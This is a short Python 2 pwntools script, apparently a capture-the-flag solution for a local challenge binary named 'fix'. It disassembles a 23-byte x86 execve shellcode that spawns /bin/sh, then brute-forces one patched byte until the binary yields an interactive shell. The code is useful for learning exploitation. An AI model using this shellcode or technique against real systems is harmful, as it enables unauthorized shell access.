from pwn import *
                                                                                                      
"""
The 23-byte shellcode
0 : 31 c0              xor eax,eax
2 : 50                 push eax
3 : 68 2f 2f 73 68     push 0x68732f2f
8 : 68 2f 62 69 6e     push 0x6e69622f
d : 89 e3              mov ebx,esp
f : 50                 push eax
10: 53                 push ebx
11: 89 e1              mov ecx,esp
13: b0 0b              mov al,0xb
15: cd 80              int 0x80
                                                                                                      
The code fails after executing code at offset 0xf
because "push eax" overwrites rest of the shellcode.
Let's brutefore some bytes on offset 0xf.
"""
                                                                                                      
for i in xrange(256):
        print "trying " + str(i)
        p = process("./fix")
        p.sendline(str(15))
        p.sendline(str(i))
        p.recvuntil("get shell\n")
        try:
                ret = p.recv(numb=4096, timeout=0.1)
                if ret == '':
                        print "Found: " + str(i)
                        p.interactive()                                                               
                        p.kill()                                                                      
                        break
                p.kill()                                                                              
        except:
                p.kill()
"""
esto escribe 92, lo cual hace pop esp.
generalmente hace que rompa pero si haces ulimit -s unlimited funciona hermosamente
"""
